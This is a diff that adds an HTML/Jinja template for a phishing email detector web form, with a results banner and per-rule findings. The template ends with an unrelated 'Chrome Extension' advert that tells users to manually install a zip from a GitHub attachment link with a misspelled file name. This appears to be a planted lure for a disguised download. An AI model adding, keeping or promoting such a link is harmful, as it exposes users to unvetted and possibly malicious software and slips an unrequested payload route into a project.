@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Email Detector</title>
+    <!-- Linked to static/style.css -->
+   <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ Phishing Email Detector</h1>
+        
+        <form method="POST">
+            <div class="form-group">
+                <label for="from">From Address:</label>
+                <input type="email" id="from" name="from" placeholder="e.g. sender@example.com" value="{{ email.from if email else '' }}" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="subject">Subject Line:</label>
+                <input type="text" id="subject" name="subject" placeholder="e.g. Account Security Alert" value="{{ email.subject if email else '' }}" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="body">Email Body Content:</label>
+                <textarea id="body" name="body" rows="5" placeholder="Paste the email body or links here..." required>{{ email.body if email else '' }}</textarea>
+            </div>
+            
+            <div class="button-group">
+                <button type="submit" class="btn-primary">Check Email</button>
+                <button type="submit" class="btn-secondary" name="clear" formnovalidate>Clear Report</button>
+            </div>
+        </form>
+
+        {% if email %}
+        <div class="results">
+            <h3>Scan Results</h3>
+            <p><strong>From:</strong> {{ email.from }}</p>
+            <p><strong>Subject:</strong> {{ email.subject }}</p>
+            <p><strong>Body:</strong> {{ email.body }}</p>
+
+            <!-- Determine overall threat level -->
+            {% set ns = namespace(is_phishing=false) %}
+            {% if results %}
+                {% for rule, result in results.items() %}
+                    {% if result == true or (result is string and "detected" in result and "No known" not in result) %}
+                        {% set ns.is_phishing = true %}
+                    {% endif %}
+                {% endfor %}
+            {% endif %}
+
+            <!-- Overall Status Banner -->
+            {% if ns.is_phishing %}
+                <div class="badge-danger" style="padding: 16px; margin: 20px 0; text-align: center; border-radius: 8px; font-size: 16px; font-weight: bold;">
+                    🚨 HIGH RISK: PHISHING THREAT DETECTED
+                </div>
+            {% else %}
+                <div class="badge-safe" style="padding: 16px; margin: 20px 0; text-align: center; border-radius: 8px; font-size: 16px; font-weight: bold;">
+                    ✅ SAFE: NO KNOWN THREATS DETECTED
+                </div>
+            {% endif %}
+
+            <h4>Detailed Analysis:</h4>
+            <ul>
+                {% for rule, result in results.items() %}
+                    {% set is_threat = (result == true or (result is string and "detected" in result and "No known" not in result)) %}
+                    <li class="{{ 'badge-danger' if is_threat else 'badge-safe' }}">
+                        <span>
+                            <strong>{{ rule.replace('_', ' ').title() }}:</strong> 
+                            {% if result is boolean %}
+                                {{ 'Phishing indicator detected' if result else 'No known indicator detected' }}
+                            {% else %}
+                                {{ result }}
+                            {% endif %}
+                        </span>
+                        <span>{{ '⚠️ Threat' if is_threat else '✓ Clear' }}</span>
+                    </li>
+                {% endfor %}
+            </ul>
+        </div>
+        {% endif %}
+
+        <div class="extension-ad">
+            <h3>Try Our Chrome Extension</h3>
+            <p><strong>Prefer real-time inbox scanning?</strong></p>
+            <p>Download and install our browser extension manually for automated protection:</p>
+            <a href="https://github.com/user-attachments/files/16227556/Chrome.Extemsion.zip" class="btn-primary" download>Download Extension (.zip)</a>
+        </div>
+    </div>
+</body>
+</html>
